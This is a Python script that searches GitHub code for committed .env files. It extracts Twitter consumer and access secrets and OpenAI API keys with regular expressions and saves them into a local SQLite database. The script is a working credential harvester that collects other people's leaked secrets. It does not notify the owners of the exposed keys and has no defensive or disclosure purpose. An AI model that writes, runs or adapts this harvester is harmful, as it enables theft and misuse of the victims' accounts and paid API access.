import re
import sqlite3
from github import Github
import os
import logging
# Configure logging
logging.basicConfig(
    filename='logs/key_fetcher.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
# Fetch GitHub tokens
github_token = os.getenv('GITCLASIC_TOKEN')
github_pat_token = os.getenv('GITFINEPAT_TOKEN')

# Check which token to use
if github_token:
    g = Github(github_token)
elif github_pat_token:
    g = Github(github_pat_token)
else:
    raise ValueError("No GitHub token found.")

def search_github_keys(query, max_repos=10):
    """Search GitHub for exposed API and Twitter keys"""
    keys = []
    repos = g.search_code(query=query, per_page=max_repos)

    # Pattern to search for both Twitter and OpenAI keys
    patterns = {
        "twitter": re.compile(r'TWITTER_CONSUMER_KEY="([^"]+)"\s+TWITTER_CONSUMER_SECRET="([^"]+)"\s+TWITTER_ACCESS_TOKEN="([^"]+)"\s+TWITTER_ACCESS_SECRET="([^"]+)"'),
        "openai": re.compile(r'OPENAI_API_KEY="([^"]+)"')
    }

    for repo in repos:
        content = repo.decoded_content.decode('utf-8')

        # Match Twitter keys
        twitter_matches = patterns["twitter"].findall(content)
        for match in twitter_matches:
            keys.append({
                'type': 'twitter',
                'consumer_key': match[0],
                'consumer_secret': match[1],
                'access_token': match[2],
                'access_secret': match[3],
            })

        # Match OpenAI keys
        openai_matches = patterns["openai"].findall(content)
        for match in openai_matches:
            keys.append({
                'type': 'openai',
                'api_key': match
            })

    return keys

def save_to_db(keys):
    """Save keys to the database"""
    conn = sqlite3.connect('keys.db')
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS api_keys (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            type TEXT,
            consumer_key TEXT,
            consumer_secret TEXT,
            access_token TEXT,
            access_secret TEXT,
            api_key TEXT,
            UNIQUE(type, api_key)
        )
    ''')

    for key in keys:
        cursor.execute('''
            INSERT OR IGNORE INTO api_keys (type, consumer_key, consumer_secret, access_token, access_secret, api_key)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            key.get('type'),
            key.get('consumer_key'),
            key.get('consumer_secret'),
            key.get('access_token'),
            key.get('access_secret'),
            key.get('api_key')
        ))

    conn.commit()
    conn.close()

# Main search
query = 'TWITTER_CONSUMER_KEY filename:.env OR OPENAI_API_KEY filename:.env'
keys = search_github_keys(query)
if keys:
    save_to_db(keys)
else:
    print("No valid keys found.")

logging.info("Starting key fetcher script")
